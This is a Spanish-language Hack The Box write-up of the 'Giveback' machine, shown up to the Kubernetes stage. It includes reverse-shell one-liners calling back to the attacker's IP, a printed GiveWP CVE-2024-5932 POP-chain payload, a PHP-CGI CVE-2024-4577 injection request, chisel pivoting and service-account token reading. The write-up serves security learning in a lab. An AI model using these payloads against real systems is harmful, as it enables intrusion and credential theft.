---
title: "Giveback - Hack The Box"
date: 2025-11-08
draft: false
slug: "htb-writeup-giveback"
excerpt: "Esta es una de las máquinas más complicadas que he hecho. Después de analizar la página web activa en el puerto 80, nos damos cuenta de que, aparte del uso de WordPress, vemos que está utilizando el plugin GiveWP, que es vulnerable a ejecución remota de comandos (CVE-2024-5932), lo que nos permite inyectar y ejecutar una Reverse Shell, ganando así acceso principal a la máquina. Vemos que estamos dentro de un contenedor que, al investigar sus variables de entorno, descubrimos que hay una red interna a la que este contenedor tiene acceso. Utilizamos chisel para aplicar Port Forwarding, con tal de poder ver una página web activa en el puerto 5000, de lo que parece ser otro contenedor. Al analizar esta página, resulta ser un CMS de uso interno, pero vemos que utiliza una versión vulnerable de PHP-CGI (CVE-2024-457), que nos permite ejecutar comandos de manera remota, siendo esta forma con la que ganamos acceso a una segunda máquina. Resulta que esta segunda máquina es otro contendor, que al revisar las variables de entorno, vemos que se está utilizando kubernetes. Investigando vulnerabilidades de Kubernetes, encontramos una forma en la que podemos suplantar la cuenta de servicio para leer los recursos Secrets, que contienen las contraseñas de algunos usuarios, siendo uno de estos quien pertenece a la máquina principal y con quien ganamos acceso a esta vía SSH. Dentro, vemos que podemos utilizar un binario que necesita una contraseña para funcionar. Usamos una de las contraseñas del servicio MariaDB y ya funciona el binario. Vemos la versión del binario y descubrimos que es el binario runc Wrapper, que es vulnerable a CVE-2024-21626, lo que nos permite crear una montura del directorio Root, logrando así escalar privilegios.."
categories: ["HackTheBox", "Medium Machine"]
tags: ["Linux", "WordPress", "Kubernetes", "Docker", "Web Enumeration", "WordPress Enumeration", "PHP Object Injection Vulnerability (giveWP - CVE-2024-5932)", "Docker Container Enumeration", "Reverse Port Forwarding", "PHP-CGI Parameter Injection (CVE-2024-457)", "Abusing Kubernetes Service Account Token to Read Secrets", "Abusing Sudoers Privileges On runC Binary", "Abusing runC Wrapper (CVE-2024-21626)", "Privesc - Abusing Sudoers Privileges On runC Binary", "Privesc - Abusing runC Wrapper (CVE-2024-21626)", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "echo"
  - "wpscan"
  - "git"
  - "python3"
  - "pip"
  - "nc"
  - "python"
  - "cat"
  - "grep"
  - "which"
  - "mysql"
  - "env"
  - "php"
  - "chisel"
  - "BurpSuite"
  - "curl"
  - "base64"
  - "ssh"
  - "sudo"
  - "vim"
links:
  - "https://www.skshieldus.com/download/files/download.do?o_fname=Research%20Technique_PHP%20Object%20Injection%20Vulnerability%20in%20WordPress%20GiveWP%20(CVE-2024-5932).pdf&r_fname=20240927174114070.pdf"
  - "https://github.com/EQSTLab/CVE-2024-5932"
  - "https://github.com/jpillora/chisel"
  - "https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure#attempts"
  - "https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/"
  - "https://pentesterlab.com/exercises/cve-2012-1823"
  - "https://github.com/ZephrFish/CVE-2024-4577-PHP-RCE"
  - "https://trustedsec.com/blog/kubernetes-for-pentesters-part-1"
  - "https://hackviser.com/tactics/pentesting/services/kubernetes"
  - "https://delinea.com/blog/linux-privilege-escalation"
  - "https://medium.com/@evyeveline1/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a"
  - "https://nitroc.org/en/posts/cve-2024-21626-illustrated/#exploit-via-setting-working-directory-to-procselffdfd"
  - "https://ancat.github.io/exploitation/2019/02/16/cve-2019-5736.html"
  - "https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/runc-privilege-escalation"
  - "https://medium.com/@avijitsarkar123/docker-and-oci-runtimes-a9c23a5646d6"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-giveback/giveback.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.94
PING 10.10.11.94 (10.10.11.94) 56(84) bytes of data.
64 bytes from 10.10.11.94: icmp_seq=1 ttl=63 time=2206 ms
64 bytes from 10.10.11.94: icmp_seq=2 ttl=63 time=1185 ms
64 bytes from 10.10.11.94: icmp_seq=3 ttl=63 time=161 ms
64 bytes from 10.10.11.94: icmp_seq=4 ttl=63 time=70.2 ms

--- 10.10.11.94 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3045ms
rtt min/avg/max/mdev = 70.228/905.390/2205.841/869.029 ms, pipe 3
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.94 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 00:55 CST
Initiating SYN Stealth Scan at 00:55
Scanning 10.10.11.94 [65535 ports]
Discovered open port 80/tcp on 10.10.11.94
Discovered open port 22/tcp on 10.10.11.94
Completed SYN Stealth Scan at 00:55, 24.60s elapsed (65535 total ports)
Nmap scan report for 10.10.11.94
Host is up, received user-set (0.12s latency).
Scanned at 2025-11-07 00:55:01 CST for 25s
Not shown: 41051 filtered tcp ports (no-response), 24482 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.70 seconds
           Raw packets sent: 121319 (5.338MB) | Rcvd: 25461 (1.018MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo solamente 2 puertos abiertos. Supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 10.10.11.94 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 00:56 CST
Nmap scan report for 10.10.11.94
Host is up (1.5s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp open  http    nginx 1.28.0

|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-server-header: nginx/1.28.0
|_http-generator: WordPress 6.8.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.94 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo ya nos está mostrando que nos enfrentamos ante un **WordPress**.

Puede que exista un dominio dentro de la página, así que entremos e investiguemos.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura1.png">
</p>

Parece ser una página que se dedica a las donaciones por caridad.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura2.png">
</p>

Son bastantes tecnologías, pero me llama la atención que se está usando **MySQL**, **Nginx**, **PHP** (obviamente) y veo que ya nos reporta un plugin llamado **GiveWP**.

Podemos revisar cada una de las secciones que tiene la página.

La primera que vemos parece ser un login al que tenemos acceso después de hacer una donación:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura3.png">
</p>

La siguiente sección solo indica que hubo un fallo en la donación realizada:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura4.png">
</p>

En la siguiente sección encontramos un dominio referenciado, siendo como un blog de las donaciones realizadas:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura5.png">
</p>

Por último, tenemos lo que parece ser otro login, pero solamente tendremos acceso una vez que hayamos realizado una donación:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura6.png">
</p>

Antes de avanzar más, registremos ese dominio en el `/etc/hosts`:
```bash
echo "10.10.11.94 giveback.htb" >> /etc/hosts
```

Al visitar la página con la que descubrimos el dominio usado, vemos que es donde podemos realizar las donaciones:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura7.png">
</p>

Regresando a la página principal, vimos que hay una publicación que, al visitarla, solo vemos una conversación sobre las donaciones, otra conversación sobre el uso a futuro de **NFP** y **EUK**:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura8.png">
</p>

Después de esto, no encuentro algo más que nos pueda ayudar.

Analicemos la máquina con la herramienta **wpscan**.

### Utilizando wpscan para Analizar Página Web de WordPress {#wpscan}

Utilicemos **wpscan** para probar si detecta algún plugin vulnerable:
```bash
wpscan --url http://giveback.htb --no-banner 
[+] URL: http://giveback.htb/ [10.10.11.94]
[+] Started: Sat Nov  8 13:54:26 2025

Interesting Finding(s):

[+] Headers

 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://giveback.htb/robots.txt

 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://giveback.htb/readme.html

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Outdated, released on 2025-04-30).

 | Found By: Emoji Settings (Passive Detection)
 |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://giveback.htb/, Match: 'WordPress 6.8.1'

[+] WordPress theme in use: bizberg

 | Location: http://giveback.htb/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *

 | Location: http://giveback.htb/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] give

 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2025-07-29T22:55:00.000Z
 | [!] The version is out of date, the latest version is 4.6.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://giveback.htb/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:34 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:34

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Nov  8 13:55:11 2025
[+] Requests Done: 173
[+] Cached Requests: 7
[+] Data Sent: 44.038 KB
[+] Data Received: 291.348 KB
[+] Memory used: 260.969 MB
[+] Elapsed time: 00:00:44
```
Obtuvimos el uso del plugin **give**, siendo el mismo **giveWP** que ya habíamos visto antes y vemos que es la versión **3.14.0**.

Si lo investigamos, vemos que es vulnerable a inyección de comandos y tiene un **CVE** asignado, siendo el **CVE-2024-5932**.

Vamos a aplicarlo.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: PHP Object Injection Vulnerability in WordPress GiveWP (CVE-2024-5932) {#giveWPexploit}

Para este aplicar este Exploit, tenemos el siguiente expoit que explica cómo funciona y comparte una herramienta que lo automatiza:
* <a href="https://www.skshieldus.com/download/files/download.do?o_fname=Research%20Technique_PHP%20Object%20Injection%20Vulnerability%20in%20WordPress%20GiveWP%20(CVE-2024-5932).pdf&r_fname=20240927174114070.pdf" target="_blank">PHP Object Injection Vulnerability in WordPress GiveWP (CVE-2024-5932)</a>

En resumen, tenemos que las versiones anteriores, a partir de **3.14.1**, son vulnerables a inyección de comandos mediante datos serializados, que se inyectan en algunos parámetros mediante la técnica de **cadena POP**.

Ya sabemos que se esta ocupando la versión **3.14.0**, pero igual podemos comprobar la versión si visitamos la ruta `/wp-content/plugins/give/languages/give.pot`:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura9.png">
</p>

Te comparto la herramienta que vamos a utilizar:
* <a href="https://github.com/EQSTLab/CVE-2024-5932" target="_blank">Repositorio de EQSTLab: CVE-2024-5932</a>

Debes clonar el repositorio y yo te recomiendo crear un entorno virtual para instalar sus requerimientos:
```bash
# Clonando repo
git clone https://github.com/EQSTLab/CVE-2024-5932.git

# Creando entorno virtual de python
python3 -m venv ~/CVE-2024-5932-venv
source ~/CVE-2024-5932-venv/bin/activate

# Instalando requerimientos
cd CVE-2024-5932
pip install -r requirements.txt
```
Con la instalación lista, ya podemos ejecutar la herramienta.

Inicia un listener con **netcat**.
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Usemos la herramienta para que ejecute una **Reverse Shell**:
```bash
python CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'"
...
============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Requested Data: 
{'give-form-id': '17', 'give-form-hash': 'c4bac925ad', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Andrea', 'give_last': 'Hendricks', 'give_email': 'phall@example.net', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:50:"bash -c \'bash -i >& /dev/tcp/Tu_IP/443 0>&1\'";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.94] 62313
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<s-696b9cb46-bnbnd:/opt/bitnami/wordpress/wp-admin$ whoami
whoami
whoami: cannot find name for user ID 1001
<s-696b9cb46-bnbnd:/opt/bitnami/wordpress/wp-admin$ id
id
uid=1001 gid=0(root) groups=0(root),1001
```
Estamos dentro, pero esto parece ser un contenedor, pues no tenemos algunos comandos básicos de **Linux** y el **prompt** es similar a los vistos en contenedores.

Te diría que intentes obtener una shell interactiva, pero puede que encuentres algunos errores.

Aun así tú inténtalo:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

### Enumeración de Contenedor Docker y Aplicando Reverse Pivoting para Alcanzar Segunda Máquina {#dockerPivot}

Al parecer no podemos ver qué usuario somos, pero veamos si existe algún otro usuario dentro del contenedor:
```bash
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/opt/bitnami/wordpress/wp-admin$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
```
Solo existe el **Root**.

Si nos movemos a un directorio anterior, podremos ver el archivo **wp-config.php**:
```bash
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/opt/bitnami/wordpress/wp-admin$ cd ..
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/opt/bitnami/wordpress$ cat wp-config.php
...
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```
Tenemos los datos necesarios para entrar en la base de datos de **MySQL/MariaDB**.

Pero si lo intentamos, tendremos un error de conexión:
```bash
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/opt/bitnami$ which mysql
/opt/bitnami/mysql/bin/mysql
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/opt/bitnami$ mysql -h localhost -ubn_wordpress -p
mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
Enter password: 
ERROR 2002 (HY000): Can't connect to local server through socket '/opt/bitnami/mysql/tmp/mysql.sock' (2)
```

Algo que siempre debemos de revisar cada vez que entramos a una máquina, son las variables de entorno. Para esto usamos el comando **env**:
```bash
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/opt/bitnami$ env
SHELL=bash
KUBERNETES_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
...
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
OS_ARCH=amd64
WEB_SERVER_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
```

Logramos identificar varias cosas de este output:
* Vemos que se están ocupando servicios como **Kubernetes**, **MariaDB**, **WordPress**, **WP-CLI**, **Apache**, **Nginx**, **Legacy Intranet**
* Encontramos lo que parecen ser credenciales de acceso al login de **WordPress**, pero no son efectivas.
* Vemos varias IPs relacionadas con estos servicios:

```bash
# Nginx
10.43.4.242
10.43.4.242:80 -> Nginx

# WordPress y WP-CLI
10.43.61.204
10.43.61.204:80 -> WordPress
10.43.61.204:443

# Legacy Intranet
10.43.2.241
10.43.2.241:5000

# MariaDB
10.43.147.82
10.43.147.82:3306

# Kubernetes
10.43.0.1
10.43.0.1:443
```
Para lo que tenemos acceso es al **WordPress** y **Nginx**.

Lo que me llama la atención es el servicio **MariaDB**, **Legacy Intranet** y **Kubernetes**.

Investiguemos la definición de los dos últimos:

| **Legacy Intranet Service** |
|:---------------------------:|
| *Un servicio de intranet heredado ("legacy intranet service") se refiere a una intranet antigua, a menudo alojada en servidores físicos y con sistemas anticuados. Estas plataformas suelen ser pasivas y desconectadas, dificultando la integración con herramientas modernas y la experiencia del empleado. Las intranets heredadas se están reemplazando por soluciones más nuevas y modernas basadas en la nube que ofrecen más personalización, conectividad y funcionalidad.* |

| **Kubernetes** |
|:--------------:|
| *Kubernetes (o K8s) es una plataforma de código abierto para implementar, escalar y administrar aplicaciones en contenedores de forma automatizada. Se creó originalmente en Google y se utiliza para agrupar contenedores en clústeres de máquinas y gestionar eficientemente el ciclo de vida de las aplicaciones. Sus principales beneficios incluyen la automatización de operaciones, la abstracción de la infraestructura, el autoescalado y la recuperación ante fallos.* |

Al no tener **ping** en la máquina, se complica un poco que podamos comprobar la conexión. Sin embargo, al estar declarado como variable de entorno, sí o sí, debemos poder conectarnos a cualquier máquina interna.

Me llama la atención ese servicio **Legacy Intranet**, así que utilicemos **chisel** para ver que hay detrás de él.

Puedes descargarlo aquí (descarga la versión **chisel_1.11.3_linux_amd64**):
* <a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: chisel</a>

Una vez qué lo tengas, debemos copiarlo en el contenedor, pero no tenemos ni **curl** ni **wget**.

Lo que sí tenemos es **php** y **base64**, puedes usar estos dos para cargar archivos en el contenedor. Yo usare **php** para mayor comodidad.

Levanta un servidor con **Python** en donde tengas **chisel**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Usa **php** en el contenedor para descargar **chisel**:
```bash
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/opt/bitnami$ cd /tmp
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/tmp$ mkdir brsk
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/tmp$ cd brsk/
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/tmp/brsk$ php -r '$file = file_get_contents("http://Tu_IP/chisel"); file_put_contents("chisel",$file);'
```
Lo tenemos.

Ahora, desde tu máquina vamos a iniciar un servidor con **chisel**:
```bash
./chisel server -p 1234 --reverse
2025/11/08 17:02:18 server: Reverse tunnelling enabled
2025/11/08 17:02:18 server: Fingerprint zCFtf...
2025/11/08 17:02:18 server: Listening on http://0.0.0.0:1234
```

Y desde el contenedor, nos conectamos a nuestro servidor aplicando **Reverse Port Forwarding** para que podamos ver el **puerto 5000** en nuestra máquina, de manera local:
```bash
I have no name!@beta-vino-wp-wordpress-6d4bcd4bbf-5bz89:/tmp/brsk$ ./chisel client Tu_IP:1234 R:5000:10.43.2.241:5000
2025/11/08 23:03:03 client: Connecting to ws://Tu_IP:1234
2025/11/08 23:03:03 client: Connected (Latency 73.056984ms)
```

Con esto listo, ya podemos ver qué hay en ese servicio:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura10.png">
</p>

Parece ser un **CMS**, pero analicémoslo a fondo.

### Probando Exploit: PHP-CGI Parameter Injection - Remote Command Execution (CVE-2024-457) y Ganando Acceso a Máquina Interna {#ExploitPHP}

Podemos ver varias cosas en esta página:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura11.png">
</p>

Resumido:
* Vemos que tienen soporte usando el **estándar CGI**.
* Hay varios recursos internos, pero solo tendremos acceso a la ruta `/cgi-bin/php-cgi`.
* El desarrollador nos deja una nota de que este servicio se implementó en **Windows IIS** y luego lo migraron a **Linux**, pero se mantuvo el manejo **CGI** al estilo **Windows** para garantizar que los scripts heredados continuaran funcionando.

Dejemos claro qué es **php-cgi**:

| **PHP-CGI** |
|:-----------:|
| *PHP-CGI es una forma de ejecutar PHP (el lenguaje de programación usado comúnmente para páginas web dinámicas) mediante el estándar CGI (Common Gateway Interface), en lugar de integrarlo directamente en el servidor web (como hace por ejemplo mod_php en Apache o php-fpm en Nginx). PHP-CGI es el binario o ejecutable de PHP que implementa ese comportamiento CGI. Está diseñado para que un servidor web (como Apache, Nginx, o Lighttpd) pueda invocar PHP a través de CGI o FastCGI.* |

Si investigamos este programa, resulta que tiene 2 vulnerabilidades asignadas como **CVE**:
* Vulnerabilidad **CVE-2012-1823**.
* Vulnerabilidad **CVE-2024-4577**.

Aunque ambas son un poco distintas, la manera de explotar la vulnerabilidad es muy similar, pues en ambos casos se pueden ejecutar comandos remotamente.

Usaremos la vulnerabilidad **CVE-2024-4577**, así que aquí te dejo un par de blogs que me ayudaron a entenderla:
* <a href="https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure#attempts" target="_blank">CVE-2024-4577 Exploits in the Wild One Day After Disclosure</a>
* <a href="https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/" target="_blank">No Way, PHP Strikes Again! (CVE-2024-4577)</a>

En resumen, la vulnerabilidad realiza inyección de argumentos, que nos permiten ejecutar comandos de manera remota.

Los blogs nos comparten una "plantilla" que podemos usar para aplicar la vulnerabilidad, pero la que se acerca más a la que ocuparemos, es la siguiente:
```bash
POST /cgi-bin/php-cgi?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: */*
Content-Length: 21
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php phpinfo(); ?>
```

Realiza una captura de la ruta `/cgi-bin/php-cgi` con **BurpSuite** y mandala al **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura12.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura13.png">
</p>

Ya que tengas la petición capturada, modifícala con la plantilla que usaremos:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura14.png">
</p>

Observa que, si mandas la petición, solo vemos unas etiquetas que dicen **[STARTED][END]**:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura15.png">
</p>

Si bien el Exploit está basado en **Windows**, también puede ser utilizado en **Linux**.

La diferencia radica en cómo se ejecutan comandos en **Linux**, simplemente dando el nombre del comando que deseamos y listo.

Observa lo que pasa si escribimos y mandamos el comando **whoami**, sin usar **PHP**:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura16.png">
</p>

Funciona, podemos ejecutar comandos.

La cuestión ahora, es obtener una sesión de este segundo contenedor, por lo que debemos aplicar **Pivoting**.

Pero esta vez no es necesario, pues tenemos conexión directa desde este segundo contenedor hacia nuestra máquina.

Levanta un listener con **netcat**:
```bash
nc -nlvp 4444
listening on [any] 4444 ...
```

Utilizaremos la siguiente **Reverse Shell**:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc Tu_IP 4444 >/tmp/f
```

Copiala en el payload y ejecutalo:

<p align="center">
<img src="/assets/images/htb-writeup-giveback/Captura17.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.94] 26307
sh: can't access tty; job control turned off
/var/www/html/cgi-bin # whoami
root
```
Estamos dentro.

Intenta obtener una sesión interactiva, pero por alguna razón, la máquina puede tumbar tu conexión, por lo que tendrías que repetir el proceso de obtener la sesión:
```bash
# Paso 1:
script /dev/null -c sh

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

### Utilizando Service Account Token de Kubernetes para Leer Recursos Secrets {#kubernetes}

Podemos revisar las variables de entorno y vemos que aquí también se están usando **Kubernetes**:
```bash
/var/www/html/cgi-bin # env
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=legacy-intranet-cms-6f7bf5db84-jm6bz
...
```
Si investigamos algunas vulnerabilidades de **Kubernetes**, encontraremos que es posible enumerar el recurso **Secrets**, qué credenciales de servicios y más.

Aquí te dejo un par de blogs:
* <a href="https://trustedsec.com/blog/kubernetes-for-pentesters-part-1" target="_blank">Kubernetes for Pentesters: Part 1</a>
* <a href="https://hackviser.com/tactics/pentesting/services/kubernetes" target="_blank">Kubernetes API</a>

La idea, es encontrar y utilizar el **token de autenticación JWT**, que es de una cuenta de servicio de **Kubernetes**, para poder consultar ese recurso **Secrets**.

El segundo blog ya nos da una ruta que podemos consultar, solo que en este caso, se modifica solo un poco:
```bash
/var/www/html/cgi-bin # cat /run/secrets/kubernetes.io/serviceaccount/token
...
```
Pero este token resulta ser dinámico, por lo que está cambiando constantemente.

Además, debemos consultar el dominio que se está utilizando para albergar la **API** de **Kubernetes**. Pues si no lo consultamos correctamente, no podremos ver ningún recurso.

